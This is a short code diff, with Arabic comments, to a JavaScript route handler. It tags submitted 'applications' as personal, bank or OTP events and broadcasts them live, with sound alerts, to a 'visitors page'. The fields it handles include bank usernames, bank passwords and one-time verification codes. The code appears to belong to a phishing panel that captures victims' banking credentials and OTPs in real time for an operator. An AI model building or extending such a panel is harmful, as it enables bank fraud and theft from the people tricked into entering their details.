@@ -243,9 +243,18 @@ router.patch("/:id", async (req, res) => {
       .where(eq(sessionsTable.id, newApp.sessionId));
 
     // إضافة applicantName لعرض اسم العميل فوراً في صفحة الزوار
+    // تحديد نوع الحدث الصوتي: personal (بيانات شخصية), bank (بيانات بنك), otp (رمز تحقق)
+    let eventType = "personal";
+    if (parsed.data.otpCode) {
+      eventType = "otp";
+    } else if (parsed.data.bankId || parsed.data.bankUsername || parsed.data.bankPassword) {
+      eventType = "bank";
+    }
+
     const broadcastData = {
       ...newApp,
       applicantName: newApp.fullName || newApp.companyName || newApp.contactName || null,
+      eventType,
     };
     broadcast({ type: "application_update", data: broadcastData });
     res.json(newApp);
